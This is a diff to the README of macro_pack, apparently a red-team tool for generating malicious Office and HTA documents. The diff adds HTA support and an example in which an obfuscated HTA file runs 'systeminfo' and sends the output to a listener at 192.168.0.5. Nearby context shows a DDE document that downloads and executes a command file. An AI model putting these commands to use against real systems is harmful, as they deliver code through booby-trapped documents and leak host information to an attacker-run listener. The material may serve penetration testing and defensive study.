@@ -45,6 +45,7 @@ Supported formats are:
 * MS Excel (.xlsm)
 * MS PowerPoint (.pptm)
 * VBA text file (.vba)
+* HTA text file (.hta)
 
 
 ### Ethical use
@@ -143,6 +144,17 @@ echo calc.exe | macro_pack.exe --dde -G dde_test.docx
 # 1 Change the target file URL in resources\community\ps_dl_exec.cmd
 # 2 Embed download execute cmd in document
 python macro_pack.py --dde -f ..\resources\community\ps_dl_exec.cmd -G DDE.doc
+```
+
+
+- Generated obfuscated HTA file which executes "systeminfo" and returns result to another macro_pack listening on 192.168.0.5
+```batch
+# 1 Generate HTA file with CMD template
+echo http://192.168.0.5:1234/a "systeminfo" | macro_pack.exe -t CMD -o -G info.hta
+# 2 On 192.168.0.5 open macro_pack as http listener
+macro_pack.exe -l 1234
+# 3 run hta file with mshta
+mshta.exe full/path/to/info.hta
 ```
 
 ### macro\_pack pro
